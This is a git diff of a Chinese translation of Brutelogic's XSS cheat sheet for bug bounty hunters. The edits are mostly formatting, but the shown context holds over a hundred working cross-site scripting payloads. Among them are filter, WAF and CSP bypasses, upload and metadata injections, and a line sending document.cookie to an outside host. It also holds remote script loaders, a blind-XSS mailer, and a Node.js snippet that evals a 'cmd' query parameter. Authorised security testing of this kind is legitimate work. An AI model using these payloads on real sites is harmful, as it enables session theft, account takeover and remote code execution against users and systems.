@@ -2,9 +2,10 @@
 
 ## 简介
 白帽赏金平台xss漏洞模糊测试有效载荷的最佳集合 2020版 <br>
-该备忘清单可用于漏洞猎人，安全分析，渗透测试人员，根据应用的实际情况测试不同的payload，并观察响应内容，查找web应用的跨站点脚本漏洞，共计100+条xss漏洞测试小技巧 <br>
+该备忘清单可用于漏洞猎人，安全分析，渗透测试人员，根据应用的实际情况,测试不同的payload，并观察响应内容，查找web应用的跨站点脚本漏洞，共计100+条xss漏洞测试小技巧 <br>
 本备忘录翻译自国外的`XSS_Cheat_Sheet_2020_Edition.pdf`议题，源文件可在本项目内直接下载 <br>
 整理完毕的测试payload清单文件为:`xss_payload_list.txt` <br>
+github项目地址:https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition
 整理不易，少侠，留个小星星再走吧 (ฅ>ω<*ฅ)～
 
 ## 摘要
@@ -30,7 +31,7 @@
 "></tag><svg onload=alert(1)>
 ```
 **3.HTML Injection - Inline （HTML注入-内联标签）** <br>
-当输入的payload，被插入到HTML标签的属性值内，但该标签不能以大于号（>）进行闭合。<br>
+当输入的payload，被插入到HTML标签的属性值内，但该标签不能以大于号（`>`）进行闭合。<br>
 ```
 "onmouseover=alert(1) //
 "autofocus onfocus=alert(1) //
@@ -57,7 +58,7 @@ javascript:alert(1)
 </script><svg onload=alert(1)>
 ```
 **8.Javascript Injection - Logical Block (javscript注入-逻辑代码块)** <br>
-当输入的payload，被插入到javascript标签块时，使用第一个或第二个payload，该值如果位于字符串分隔值或在单个逻辑代码块（如函数或条件（if，else，等等中）。 如果需要引用转义反斜杠，请使用第3个payload。
+当输入的payload，被插入到javascript标签块时，使用第一个或第二个payload，该值如果位于字符串分隔值或在单个逻辑代码块（如函数或条件（`if，else`，等等中）。 如果需要引用转义反斜杠，请使用第3个payload。
 ```
 '}alert(1);{'
 '}alert(1)%0A{'
@@ -91,7 +92,7 @@ payload用于利用同一页面上的多次反射。<br>
 */</script>'>alert(1)/*<script/1='
 ```
 **13.Multi Input Reflections HTML Injection - Double & Triple (HTML注入多输入反射-两次和三次)** <br>
-payload用于利用同一页面上的多个输入反射。在HPP（HTTP参数污染）其中存在重复参数的反射。 第三个payload利用相同参数的逗号分隔进行反射。<br>
+payload用于利用同一页面上的多个输入反射。在`HPP`（HTTP参数污染）其中存在重复参数的反射。 第三个payload利用相同参数的逗号分隔进行反射。<br>
 ```
 p=<svg/1='&q='onload=alert(1)>
 p=<svg 1='&q='onload='/*&r=*/alert(1)'>
@@ -103,12 +104,12 @@ payload用于用户上传的文件名返回在目标页面的某处时使用。
 "><svg onload=alert(1)>.gif
 ```
 **15.File Upload Injection – Metadata (文件上传注入-元数据)** <br>
-payload用于，当上传文件的元数据返回在目标页面中的某处时使用。 它可以使用命令行exiftool（"$"是终端提示），并且可以设置任何元数据字段。
+payload用于，当上传文件的元数据返回在目标页面中的某处时使用。 它可以使用命令行`exiftool`（"$"是终端提示），并且可以设置任何元数据字段。
 ```
 $ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
 ```
 **16.File Upload Injection – SVG File (文件上传注入-SVG文件)** <br>
-上传图像文件时，用于在目标上创建存储的XSS payload。 将以下内容另存为"xss.svg"文件 <br>
+上传图像文件时，用于在目标上创建存储的XSS payload。 将以下内容另存为`"xss.svg"`文件 <br>
 ```
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
 ```
@@ -128,7 +129,7 @@ data:text/html,<img src=1 onerror=alert(1)>
 data:text/html,<iframe src=javascript:alert(1)>
 ```
 **19.PHP Self URL Injection (PHP self URL注入)** <br>
-当网站服务器端PHP代码，将当前URL当作HTML表单属性值进行获取。payload在斜杠（/）在php扩展名和查询部分的开始（？）之间插入。<br>
+当网站服务器端PHP代码，将当前URL当作HTML表单属性值进行获取。payload在斜杠`（/）`在php扩展名和查询部分的开始`（？）`之间插入。<br>
 ```
 https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader
 ```
@@ -138,31 +139,31 @@ https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader
 [clickme](javascript:alert`1`)
 ```
 **21.Script Injection - No Closing Tag (脚本注入-没有结束标记)** <br>
-payload在反射后的javascript代码中有结束脚本标签（</script>）时使用。 <br>
+payload在反射后的javascript代码中有结束脚本标签（`</script>`）时使用。 <br>
 ```
 <script src=data:,alert(1)>
 <script src=//brutelogic.com.br/1.js>
 ```
 **22.Javascript postMessage() DOM Injection (with Iframe) (Javascript postMessage() DOM注入（带有Iframe）)** <br>
-在JavaScript代码中有"message"事件监听器(如"window.addEventListener('message',...)")时使用该payload，并且服务器端没有检查来源。 如果能够对目标进行请求伪造（根据http请求 X-Frame Options标头）。 则另存一个HTML文件（或者使用data:text/html，以提供TARGET_URL和INJECTION（xss payload）进行测试。<br>
+在`JavaScript`代码中有`"message"`事件监听器(如`"window.addEventListener('message',...)"`)时使用该payload，并且服务器端没有检查来源。 如果能够对目标进行请求伪造（根据`http`请求 `X-Frame Options`标头）。 则另存一个`HTML`文件（或者使用`data:text/html`，以提供`TARGET_URL和INJECTION（xss payload）`进行测试。<br>
 ```
 <iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
 ```
 **23.XML-Based XSS (基于XML的XSS)** <br>
-该payload用于在XML页面(内容类型为text/xml或application/xml）中进行测试。如果输入点位于注释部分，则在payload前添加"->"；如果输入位于CDATA部分，则将"->"添加payload。<br>
+该payload用于在`XML`页面(内容类型为`text/xml或application/xml`）中进行测试。如果输入点位于注释部分，则在payload前添加"->"；如果输入位于CDATA部分，则将"->"添加payload。<br>
 ```
 <x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
 <x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
 ```
 **24.AngularJS Injections (v1.6 and up) (AngularJS注入(v1.6及更高版本))。** <br>
 第一个payload用于在页面中，带有ng-app指令的HTML块中进行测试。<br>
-第二个payload用于创建自己的AngularJS库时使用。<br>
+第二个payload用于创建自己的`AngularJS`库时使用。<br>
 ```
 {{$new.constructor('alert(1)')()}}
 <x ng-app>{{$new.constructor('alert(1)')()}}
 ```
 **25.Onscroll Universal Vector (通用Onscroll事件 测试payload)** <br>
-使用onscroll事件处理web应用时，用户无需交互即可触发XSS漏洞。它与address, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul,和h1到h6 HTML标签一起使用。 <br>
+使用onscroll事件处理web应用时，用户无需交互即可触发XSS漏洞。它与`address, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul,和h1到h6 `HTML标签一起使用。 <br>
 ```
 <p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y
 ```
@@ -173,7 +174,7 @@ payload在反射后的javascript代码中有结束脚本标签（</script>）时
 1"><svg onload=alert(1)>
 ```
 **27.XSS in SSI (SSI中的XSS漏洞)** <br>
-该payload在服务器端包含（SSI）注入时使用。<br>
+该payload在服务器端包含`（SSI）`注入时使用。<br>
 ```
 <<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
 ```
@@ -190,24 +191,24 @@ payload在反射后的javascript代码中有结束脚本标签（</script>）时
 //DOMAIN/PATH/;"><svg onload=alert(1)>
 ```
 **30.JS Injection - ReferenceError Fix (javascript注入-修复ReferenceError错误)** <br>
-该payload用于修复一些javascript代码的语法。 通过查看浏览器开发人员工具（F12）中的"控制台"选项卡，是否有相应的ReferenceError，并相应地替换变量和函数名称进行测试。<br>
+该payload用于修复一些javascript代码的语法。 通过查看浏览器开发人员工具（F12）中的"控制台"选项卡，是否有相应的`ReferenceError`，并相应地替换变量和函数名称进行测试。<br>
 ```
 ';alert(1);var myObj='
 ';alert(1);function myFunc(){}'
 ```
 **31.Bootstrap Vector (up to v3.4.0) (Bootstrap最新版xss测试)** <br>
-该payload用于web应用调用bootstrap库时进行测试。 href值的任何char都可以进行HTML编码，只需单击页面中的任意位置即可触发，并且绕过Webkit Auditor过滤器。 <br>
+该payload用于web应用调用`bootstrap`库时进行测试。 `href`值的任何`char`都可以进行HTML编码，只需单击页面中的任意位置即可触发，并且绕过`Webkit Auditor`过滤器。 <br>
 ```
 <html data-toggle=tab href="<img src=x onerror=alert(1)>">
 ```
 **32.Browser Notification (浏览器通知)** <br>
-以下payload用作alert()，prompt()和confirm()函数的替代方法。 如果用户已经触发第一个payload，就可以使用第二个payload进行测试。<br>
+以下payload用作`alert()`，`prompt()`和`confirm()`函数的替代方法。 如果用户已经触发第一个payload，就可以使用第二个payload进行测试。<br>
 ```
 Notification.requestPermission(x=>{new(Notification)(1)})
 new(Notification)(1)
 ```
 **33.XSS in HTTP Header - Cached (HTTP请求头中-缓存xss)** <br>
-该payload用于使用MISS-MISS-HIT缓存方案（如果服务器端开启）在应用程序中测试存储XSS。 将XSS标签替换为相应的payload，并将TARGET替换为虚拟字符串， 触发相同的请求3次，以避免页面的实际缓存信息。<br>
+该payload用于使用`MISS-MISS-HIT`缓存方案（如果服务器端开启）在应用程序中测试存储XSS。 将XSS标签替换为相应的payload，并将`TARGET`替换为虚拟字符串， 触发相同的请求3次，以避免页面的实际缓存信息。<br>
 ```
 $ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string
 ```
@@ -224,7 +225,7 @@ $ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string
 <svg onload="alert(1)"
 ```
 **36.Uppercase XSS (大写 XSS)** <br>
-当web应用以大写形式返回用户的输入时使用该payload。 URL中将"＆"替换为"％26"，将"＃"替换为"％23"。<br>
+当web应用以大写形式返回用户的输入时使用该payload。 URL中将`"＆"`替换为`"％26"`，将"＃"替换为`"％23"`。<br>
 ```
 <SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
 <SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
@@ -252,7 +253,7 @@ setTimeout`alert\x28document.domain\x29`
 setInterval`alert\x28document.domain\x29`
 ```
 **41.Alert without Parentheses – HTML Entities (不带括号的弹窗– HTML实体)** <br>
-当前的payload只能在HTML代码注入中使用，当web应用不允许使用括号时。 在URL中将"＆"替换为"％26"，将"＃"替换为"％23"。 <br>
+当前的payload只能在HTML代码注入中使用，当web应用不允许使用括号时。 在URL中将`"＆"`替换为`"％26"`，将`"＃"`替换为`"％23"`。 <br>
 ```
 <svg onload=alert&lpar;1&rpar;>
 <svg onload=alert&#40;1&#41>
@@ -264,7 +265,7 @@ setInterval`alert\x28document.domain\x29`
 ('\141\154\145\162\164\50\61\51')()
 ```
 **43.Alert Obfuscation (弹窗混淆)** <br>
-以下payload用于欺骗基于正则表达式（regex）的过滤器。 可以将其与以前的绕过方法结合使用。 根据上下文，最短的选项"top"也可以替换为"window"，"parent"，"self"或者"this" <br>
+以下payload用于欺骗基于正则表达式（`regex`）的过滤器。 可以将其与以前的绕过方法结合使用。 根据上下文，最短的选项`"top"`也可以替换为`"window"`，`"parent"`，`"self"或者"this"` <br>
 ```
 (alert)(1)
 a=alert,a(1)
@@ -276,20 +277,20 @@ top['al\145rt'](1)
 top[8680439..toString(30)](1)
 ```
 **44.Alert Alternative – Write & Writeln (弹窗代替方案-Write & Writeln)** <br>
-以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。 如果在HTML标签块中则可以直接使用，但如果是javascript注入，则需要完整的"document.write"形式。 URL中将"＆"替换为"％26"，将"＃"替换为"％23"。 可以用writeln代替Write。 <br>
+以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。 如果在HTML标签块中则可以直接使用，但如果是javascript注入，则需要完整的`"document.write"`形式。 URL中将"＆"替换为"％26"，将`"＃"`替换为`"％23"`。 可以用`writeln`代替`Write`。 <br>
 ```
 write`XSSed!`
 write`<img/src/o&#78error=alert&lpar;1)&gt;`
 write('\74img/src/o\156error\75alert\501\51\76')
 ```
 **45.Alert Alternative – Open Pseudo-Protocol (弹窗代替方案-使用伪协议打开)** <br>
-以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。 以上技巧也适用于此。 但只有第二个payload可以在基于Chromium的浏览器中触发，并且需要`<iframe name = 0>`。<br>
+以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。 以上技巧也适用于此。 但只有第二个payload可以在基于`Chromium`的浏览器中触发，并且需要`<iframe name = 0>`。<br>
 ```
 top.open`javas\cript:al\ert\x281\x29`
 top.open`javas\cript:al\ert\x281\x29${0}0`
 ```
 **46.Alert Alternative - Eval + URL (弹窗代替方案-eval+url)** <br>
-以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。第一个payload是原始形式，第二个payload是eval，它使用payload的id属性值替换eval。<br> URL必须采用以下方式:在PHP扩展后的URL路径中或URL的片段中。 加号（+）必须用URL进行编码。<br>
+以下payload用作弹窗函数:`alert`，`prompt`,`confirm`的替代方法。第一个payload是原始形式，第二个payload是eval，它使用payload的id属性值替换`eval`。<br> URL必须采用以下方式:在PHP扩展后的URL路径中或URL的片段中。 加号`（+）`必须用URL进行编码。<br>
 ```
 <svg onload=eval(" ' "+URL)>
 <svg id=eval onload=top[id](" ' "+URL)>
@@ -310,19 +311,19 @@ ${alert(1)}<svg onload=eval('`//'+URL)>
 "autofocus onfocusin=alert(1) //
 ```
 **49.Strip-Tags Based Bypass (基于去除标签的绕过)** <br>
-以下payload用于,当过滤器filter去掉<and>标签字符之间的任何内容时进行测试，如PHP的`strip_tags()`功能,但仅限内联注入 <br>
+以下payload用于,当过滤器`filter`去掉`<and>`标签字符之间的任何内容时进行测试，如PHP的`strip_tags()`功能,但仅限内联注入 <br>
 ```
 "o<x>nmouseover=alert<x>(1)//
 "autof<x>ocus o<x>nfocus=alert<x>(1)//
 ```
 **50.File Upload Injection – HTML/js GIF Disguise (文件上传注入- HTML/js GIF伪装)** <br>
-以下payload用于通过文件上传绕过CSP限制。将下面的所有内容保存为"xss.gif"或"xss.js"（用于严格的MIME检查）。这是PHP的image/gif文件,它可以通过`<link rel=import href=xss.gif>`（也称为"xss.js"）或`<script src=xss.js></script>`导入到目标web应用。<br>
+以下payload用于通过文件上传绕过CSP限制。将下面的所有内容保存为`"xss.gif"`或`"xss.js"`（用于严格的MIME检查）。这是PHP的`image/gif`文件,它可以通过`<link rel=import href=xss.gif>`（也称为"xss.js"）或`<script src=xss.js></script>`导入到目标web应用。<br>
 ```
 GIF89a=//<script>
 alert(1)//</script>;
 ```
 **51.Jump to URL Fragment (url分段跳转)** <br>
-例如，当我们需要在payload中隐藏一些会触发WAF的关键字符,可以在URL片段`（#）`之后使用各自的payload进行绕过。<br>
+例如，当我们需要在payload中隐藏一些会触发`WAF`的关键字符,可以在URL片段`（#）`之后使用各自的payload进行绕过。<br>
 
 ```
 eval(URL.slice(-8)) #alert(1)
@@ -335,18 +336,18 @@ document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
 &lt;svg/onload&equals;alert(1)&gt;
 ```
 **53.PHP Spell Checker Bypass (PHP拼写检查绕过)** <br>
-以下payload用于绕过PHP的pspell_new()函数，该函数提供一个字典来尝试猜测用于搜索的输入. <br>
+以下payload用于绕过PHP的`pspell_new()`函数，该函数提供一个字典来尝试猜测用于搜索的输入. <br>
 ```
 <scrpt>confirm(1)</scrpt>
 ```
 **54.Event Origin Bypass for postMessage() XSS (postMessage()事件源XSS绕过)** <br>
-以下payload用于在目标的javascript代码中可以绕过对源代码的检查时进行测试，将允许的源代码检查的参数,用于发送payload攻击域的子域。在本地主机上使用CrossPwn脚本作为示例（在附加部分中进行提供）。<br>
+以下payload用于在目标的`javascript`代码中可以绕过对源代码的检查时进行测试，将允许的源代码检查的参数,用于发送payload攻击域的子域。在本地主机上使用`CrossPwn`脚本作为示例（在附加部分中进行提供）。<br>
 ```
 http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
 status.html&msg=<script>alert(1)</script>
 ```
 **55.CSP Bypass (for Whitelisted Google Domains) (CSP 绕过(通过谷歌白名单域名))** <br>
-以下payload用于,当存在允许这些白名单域执行CSP（内容安全策略）时使用。<br>
+以下payload用于,当存在允许这些白名单域执行`CSP`（内容安全策略）时使用。<br>
 ```
 <script src=//www.google.com/complete/search?client=chrome%26jsonp=alert(1)>
 </script>
@@ -355,14 +356,14 @@ status.html&msg=<script>alert(1)</script>
 </script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}
 ```
 **56.SVG Vectors with Event Handlers (带有事件处理程序的SVG向量)** <br>
-以下payload它可以在Firefox上触发，但是通过在<set>中添加attributename=x参数也可以在Chromium中工作。用于黑名单绕过,"Set"也可以替换为"animate"。<br>
+以下payload它可以在`Firefox上`触发，但是通过在`<set>`中添加`attributename=x`参数也可以在`Chromium`中工作。用于黑名单绕过,`"Set"`也可以替换为`"animate"`。<br>
 ```
 <svg><set onbegin=alert(1)>
 <svg><set end=1 onend=alert(1)>
 ```
 
 **57.SVG Vectors without Event Handlers (不带事件处理程序的SVG向量)** <br>
-以下payload用于避免过滤器查找事件处理程序或src、data等。进行url编码后的最后一个payload仅适用于Firefox <br>
+以下payload用于避免过滤器查找事件处理程序或`src`、`data`等。进行`url`编码后的最后一个payload仅适用于`Firefox` <br>
 ```
 <svg><a><rect width=99% height=99% /><animate attributeName=href
 to=javascript:alert(1)>
@@ -398,7 +399,7 @@ hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
 <math><brute xlink:href=javascript:alert(1)>click
 ```
 **59.Vectors with Agnostic Event Handlers (带有未知事件处理程序的向量)** <br>
-如果web应用不允许使用所有已知的HTML标记名时，请使用以下payload。任何字母字符或字符串都可以用作标签名名来代替"x"。<br>
+如果web应用不允许使用所有已知的`HTML`标记名时，请使用以下payload。任何字母字符或字符串都可以用作标签名名来代替`"x"`。<br>
 如payload本身所述,有些需要用户交互才能触发.<br>
 ```
 <x contenteditable onblur=alert(1)>lose focus!
@@ -432,8 +433,8 @@ hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
 <x onpointerrawupdate=alert(1)>hover this!
 ```
 **60.Mixed Context Reflection Entity Bypass (反射实体混合上下文绕过)** <br>
-以下payload用于在实际有效的js代码中的脚本块中转换特定的代码。它需要以在HTML和javascript上下文标签这种顺序执行，并且相关联彼此。<br>
-这个svg标记将使下一个脚本块中的单引号编码为`&#39;`或`&apos;`，并触发弹窗。<br>
+以下payload用于在实际有效的js代码中的脚本块中转换特定的代码。它需要以在`HTML`和`javascript`上下文标签这种顺序执行，并且相关联彼此。<br>
+这个`svg`标记将使下一个脚本块中的单引号编码为`&#39;`或`&apos;`，并触发弹窗。<br>
 以下javascript场景的payload，分别为：<br>
 消除单引号、完全转义单引号、消除双引号和完全转义双引号 <br>
 ```
@@ -443,7 +444,7 @@ hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
 "&#34>alert(1)-&#34<svg>
 ```
 **61.Strip-My-Script Vector (去除脚本向量)** <br>
-以下payload用于欺骗xss过滤器,用于去除最经典和最知名的XSS payload,它的工作原理是"<script>"标签被删除。 <br>
+以下payload用于欺骗xss过滤器,用于去除最经典和最知名的XSS payload,它的工作原理是`"<script>"`标签被删除。 <br>
 ```
 <svg/on<script><script>load=alert(1)//</script>  
 ```
@@ -466,24 +467,24 @@ hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
 %CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
 ```
 **65.Vectors Exclusive for ASP Pages (ASP网页专用payload)** <br>
-以下payload用于绕过.asp页中的`<[alpha]`筛选。<br>
+以下payload用于绕过`.asp`页中的`<[alpha]`筛选。<br>
 ```
 %u003Csvg onload=alert(1)>
 %u3008svg onload=alert(2)>
 %uFF1Csvg onload=alert(3)>
 ```
 **66.PHP Email Validation Bypass (PHP电子邮件验证绕过)** <br>
-以下payload用于绕过PHP的`FILTER_var()`函数的FILTER_VALIDATE_EMAIL(筛选验证电子邮件)标志。<br>
+以下payload用于绕过PHP的`FILTER_var()`函数的`FILTER_VALIDATE_EMAIL`(筛选验证电子邮件)标志。<br>
 ```
 "><svg/onload=alert(1)>"@x.y
 ```
 **67.PHP URL Validation Bypass (PHP URL验证绕过)** <br>
-以下payload用于绕过PHP的`FILTER_var()`函数的FILTER_VALIDATE_EMAIL(筛选验证电子邮件)标志。<br>
+以下payload用于绕过PHP的`FILTER_var()`函数的`FILTER_VALIDATE_EMAIL`(筛选验证电子邮件)标志。<br>
 ```
 javascript://%250Aalert(1)
 ```
 **68.PHP URL Validation Bypass – Query Required (PHP URL验证绕过-需要查询)** <br>
-以下payload用于绕过PHP需要筛选标志查询(FILTER_FLAG_QUERY_REQUIRED),筛选验证电子邮件(FILTER_VALIDATE_EMAIL)的`filter_var()`函数。<br>
+以下payload用于绕过PHP需要筛选标志查询(`FILTER_FLAG_QUERY_REQUIRED`),筛选验证电子邮件(`FILTER_VALIDATE_EMAIL`)的`filter_var()`函数。<br>
 ```
 javascript://%250Aalert(1)//?1
 javascript://%250A1?alert(1):0
@@ -491,7 +492,7 @@ javascript://%250A1?alert(1):0
 javascript://https://DOMAIN/%250A1?alert(1):0
 ```
 **69.DOM Insertion via Server Side Reflection (通过服务器端反射插入DOM)** <br>
-以下payload用于,当输入被反射到源中而不能执行时使用,为了避免浏览器筛选和WAF,插入到DOM中。<br>
+以下payload用于,当输入被反射到源中而不能执行时使用,为了避免浏览器筛选和`WAF`,插入到`DOM`中。<br>
 ```
 \74svg o\156load\75alert\501\51\76
 ```
@@ -502,12 +503,12 @@ javascript://https://DOMAIN/%250A1?alert(1):0
 <_:script xmlns:_="http://www.w3.org/1999/xhtml">alert(1)</_:script>
 ```
 **71.Javascript Context - Code Injection (IE11/Edge Bypass) (Javascript上下文-代码注入（IE11/Edge 绕过）)** <br>
-以下payload用于在注入javascript上下文时,绕过Microsoft IE11或Edge浏览器。 <br>
+以下payload用于在注入javascript上下文时,绕过`Microsoft IE11`或`Edge`浏览器。 <br>
 ```
 "'>confirm&lpar;1)</Script><Svg><Script/1='
 ```
 **72.Javascript Pseudo-Protocol Obfuscation (Javascript伪协议混淆)** <br>
-以下payload用于绕过查找`javascript:alert(1)`的筛选器。在添加`alert(1)`之前，请确保它可以与"1"成功弹窗,这个payload可能需要一些额外的模糊处理,通过url编码,才能完全绕过过滤器。最后一个选项仅适用于payload的DOM操作（例如在基于位置的payload或基于DOM的XSS中）。<br>
+以下payload用于绕过查找`javascript:alert(1)`的筛选器。在添加`alert(1)`之前，请确保它可以与"1"成功弹窗,这个payload可能需要一些额外的模糊处理,通过url编码,才能完全绕过过滤器。最后一个选项仅适用于payload的`DOM`操作（例如在基于位置的payload或基于`DOM`的XSS中）。<br>
 ```
 javas&#99ript:1
 javascript&colon;1
@@ -572,8 +573,8 @@ import('//domain/file')
 ```
 
 **78.Invisible Foreign XSS Embedding (不可见的外部XSS嵌入)** <br>
-以下payload用于将XSS从另一个域（或子域）加载到当前域中。受限于目标域的X-Frame-Options（XFO）头文件。<br>
-下面是brutelogic.com.br上下文中的弹窗示例,不分域名。<br>
+以下payload用于将XSS从另一个域（或子域）加载到当前域中。受限于目标域的`X-Frame-Options（XFO）`头文件。<br>
+下面是`brutelogic.com.br`上下文中的弹窗示例,不分域名。<br>
 ```
 <iframe src="//brutelogic.com.br/xss.php?a=<svg onload=alert(document.domain)>"
 style=display:none></iframe>
@@ -584,7 +585,7 @@ style=display:none></iframe>
 documentElement.innerHTML='<h1>Not Found</h1>'
 ```
 **80.Blind XSS Mailer (xss邮件盲打)** <br>
-以下payload将其于远程XSS盲打脚本，另存为PHP文件并更改$to和$headers变量 <br>
+以下payload将其于远程XSS盲打脚本，另存为PHP文件并更改`$to`和`$headers`变量 <br>
 因此。需要一台Postfix这样的工作邮件服务器。<br>
 ```
 <?php header("Content-type: application/javascript"); ?>
@@ -632,7 +633,7 @@ require('http').createServer(function(req,res){res.end(1-
 eval(require('url').parse(req.url,1).query.cmd))}).listen(5855)
 ```
 **83.Cookie Stealing (窃取cookie信息)** <br>
-用于从目标站点设置的受害者用户获取所有cookie。如果无法通过httpOnly安全标志。则在URL中将"+"编码为"%2B" <br>
+用于从目标站点设置的受害者用户获取所有cookie。如果无法通过`httpOnly`安全标志。则在URL中将"+"编码为"%2B" <br>
 ```
 fetch('//brutelogic.com.br/?c='+document.cookie)
 ```
@@ -666,7 +667,7 @@ SHA256 1234567890123456789012345678901234567890123 <svg/onload=alert(1)>
 
 ```
 **88.PHP Sanitizing for XSS (PHP xss过滤)** <br>
-以下代码只用于阻止每个上下文中的xss，只要输入不返回在非分隔字符串、反勾号中间或任何其他类似于eval的函数（JS上下文中的所有函数）中。但是它不防止基于DOM的XSS，只防止基于源代码的XSS。<br>
+以下代码只用于阻止每个上下文中的xss，只要输入不返回在非分隔字符串、反勾号中间或任何其他类似于`eval`的函数（JS上下文中的所有函数）中。但是它不防止基于DOM的XSS，只防止基于源代码的XSS。<br>
 ```
 $input = preg_replace("/:|\\\/", "", htmlentities($input, ENT_QUOTES))
 ```
@@ -678,7 +679,7 @@ onload=function(){$.getScript('//brutelogic.com.br/2.js')}
 onload=x=>$.getScript('//brutelogic.com.br/2.js')
 ```
 **90.Image Vectors - Alternative Event Handlers (图像向量-可选事件处理程序)** <br>
-以下payload用于触发事件处理程序,不同于onerror事件。 <br>
+以下payload用于触发事件处理程序,不同于`onerror`事件。 <br>
 ```
 <img
 <image
@@ -704,7 +705,7 @@ onloadstart=alert(1)>
 <body onorientationchange=alert(1)>
 ```
 **93.Body Tag (body 标签)** <br>
-body标签的集合。最后一个只适用于Internet Explorer浏览器。<br>
+body标签的集合。最后一个只适用于`Internet Explorer`浏览器。<br>
 ```
 <body onload=alert(1)>
 <body onpageshow=alert(1)>
@@ -741,18 +742,18 @@ d=document,i=d.createElement('img');i.src='//brutelogic.com.br/brutality.jpg';
 d.body.insertBefore(i,d.body.firstChild);new(Audio)('//brutelogic.com.br/brutality.mp3').play();
 ```
 **97.Alternative PoC - Alert Hidden Values (非传统的xss payload)** <br>
-以下payload用于证明所有隐藏的HTML值（如目标页面中的标记和nonce）都可以被窃取。<br>
+以下payload用于证明所有隐藏的HTML值（如目标页面中的标记和`nonce`）都可以被窃取。<br>
 ```
 f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden')
 {alert(e[n].name+': '+e[n].value)}}}
 ```
 **98.Improved Likelihood of Mouse Events (提高鼠标事件的可能性)** <br>
-以下payload用于创建要触发鼠标事件的更大区域范围。在任何使用鼠标事件（如onmouseover、onclick等）的XSS payload中添加以下内容（作为属性）。<br>
+以下payload用于创建要触发鼠标事件的更大区域范围。在任何使用鼠标事件（如`onmouseover`、`onclick`等）的XSS payload中添加以下内容（作为属性）。<br>
 ```
 style=position:fixed;top:0;left:0;font-size:999px
 ```
 **99.Alternative to Style Tag (替代css样式标记)** <br>
-以下payload用于当内联和标记名的"style"关键字被阻止时使用 <br>
+以下payload用于当内联和标记名的`"style"`关键字被阻止时使用 <br>
 ```
 <link rel=stylesheet href=//HOST/FILE>
 <link rel=stylesheet href=data:text/css,CSS>
@@ -786,7 +787,7 @@ function CrossPwn() {frames[0].postMessage(msg,'*')}
 </html>
 ```
 **101.Location Based Payloads (基于位置的有效载荷)** <br>
-下面的XSS payload使用一种更详细的方法来执行负载，使用文档属性来提供另一个文档属性，即位置属性。这就产生了复杂的向量，对于绕过滤器和waf非常有用。因为它们使用任意标记（XHTML），所以可以使用前面看到的任何未知的事件处理程序。这里，"onmouseover"将用作默认值。在URL中将加号（＋）编码为%2B。<br>
+下面的XSS payload使用一种更详细的方法来执行负载，使用文档属性来提供另一个文档属性，即位置属性。这就产生了复杂的向量，对于绕过滤器和`waf`非常有用。因为它们使用任意标记（`XHTML`），所以可以使用前面看到的任何未知的事件处理程序。这里，`"onmouseover"`将用作默认值。在URL中将加号`（＋）`编码为`%2B`。<br>
 
 **102.Location Basics (位置基础知识)** <br>
 payload与更简单的操作，以实现重定向到javascript伪协议。 <br>
@@ -858,25 +859,24 @@ onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
 字符也可以是URL或HTML编码的。 <br>
 Vector Scheme 1 (tag name + handler)
 ```
-pass 表格看附件
+pass 
 ```
 Vector Scheme 2 (tag name + attribute + handler)
 
 ```
-pass 表格看附件
+pass 
 ```
 Vector Scheme 3 (tag name + href|src|data|action|formaction)
 ```
-pass 表格看附件
+pass 
 ```
 
 ## 致谢
 **英文议题作者：** <br>
-@brutelogic <br>
-<br>
+`@brutelogic `
 **中文翻译团队：**<br>
-@farmsec <br>
-@farmsec_answer <br>
-@farmsec_alice <br>
-@farmsec_lancet <br>
+`@farmsec `
+`@farmsec_answer `
+`@farmsec_alice `
+`@farmsec_lancet`
 
